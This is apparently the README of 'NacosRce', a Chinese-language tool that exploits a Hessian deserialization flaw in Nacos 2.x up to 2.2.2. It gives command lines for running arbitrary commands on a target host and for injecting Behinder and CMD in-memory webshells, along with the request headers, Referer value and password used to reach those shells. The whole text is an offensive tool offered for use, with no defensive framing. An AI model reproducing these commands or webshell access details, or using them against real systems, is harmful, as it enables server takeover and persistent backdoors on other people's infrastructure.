# NacosRce



```text
 _   __                         ______         
/ | / /___ __________  _____   / ____/  ______
/  |/ / __ `/ ___/ __ \/ ___/  / __/ | |/_/ __ \
/ /|  / /_/ / /__/ /_/ (__  )  / /____>  </ /_/ /
/_/ |_/\__,_/\___/\____/____/  /_____/_/|_/ .___/
/_/
```

Nacos Hessian 反序列化漏洞利用工具 v0.2
Author: 刨洞安全 && 凉风
** 食用方式 **
执行无回显命令	
java -jar NacosRce.jar ip:port "[command]"
同时注入冰蝎&&CMD内存马(推荐)
java -jar NacosRce.jar ip:port memshell


冰蝎内存马使用方法：
1、需要设置请求头x-client-data:rebeyond
2、设置Referer:https://www.google.com/
3、路径随意
4、密码rebeyond
CMD内存马使用方法：
1、需要设置请求头x-client-data:cmd
2、设置Referer:https://www.google.com/
3、请求头cmd:要执行的命令

v0.2版本实现了：
1、不出网漏洞利用
2、可多次发起漏洞利用
3、注入冰蝎/CMD内存马
tips:
1、请用jdk1.8
2、适用于 Nacos 2.x <= 2.2.2
3、非集群的也能打哦


参考
https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/
https://exp.ci/2023/06/14/Nacos-JRaft-Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/
https://github.com/Y4er/ysoserial
